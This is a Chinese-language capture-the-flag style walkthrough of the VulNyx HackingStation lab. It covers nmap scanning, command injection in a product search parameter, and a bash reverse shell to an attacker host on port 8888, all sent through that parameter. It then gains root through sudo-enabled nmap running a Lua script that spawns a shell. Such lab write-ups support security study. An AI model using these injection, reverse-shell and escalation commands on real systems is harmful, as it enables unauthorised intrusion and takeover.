# 环境

来自[vulnyx_HackingStation](https://vulnyx.com/#HackingStation)，利用网站存在命令执行拿到shell

# 信息收集

## 主机发现

```bash
sudo nmap -sn 192.168.88.0/24
```

![image-20240712164414439](image/image-20240712164414439.png)

## 端口扫描

```bash
sudo nmap -sT -r -p- 192.168.88.32
```

![image-20240712164643449](image/image-20240712164643449.png)

## 服务详情

```bash
sudo nmap -sV -sC -O -p80 192.168.88.32
```

![image-20240712164920040](image/image-20240712164920040.png)

## 目录扫描

```bash
dirsearch -u http://192.168.88.32
```

# web渗透



## 命令执行拿shell

访问80，发现有个搜索功能

![image-20240712170820763](image/image-20240712170820763.png)

我们尝试sql注入发现无果，然后尝试命令执行，payload=`http://192.168.88.32/exploitQuery.php?product=apache;id`

![image-20240712171150937](image/image-20240712171150937.png)

进行反弹shell，抓包使用url编码发送

payload=`http://192.168.88.32/exploitQuery.php?product=apache;bash -c 'bash -i >& /dev/tcp/192.168.88.10/8888 0>&1'`

![image-20240712171758082](image/image-20240712171758082.png)

![image-20240712171833570](image/image-20240712171833570.png)

## 提取

```bash
sudo -l
```

![image-20240712173323390](image/image-20240712173323390.png)

发现nmap可以使用root权限，[nmap命令提取](https://gtfobins.github.io/gtfobins/nmap/)

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

![image-20240712174116764](image/image-20240712174116764.png)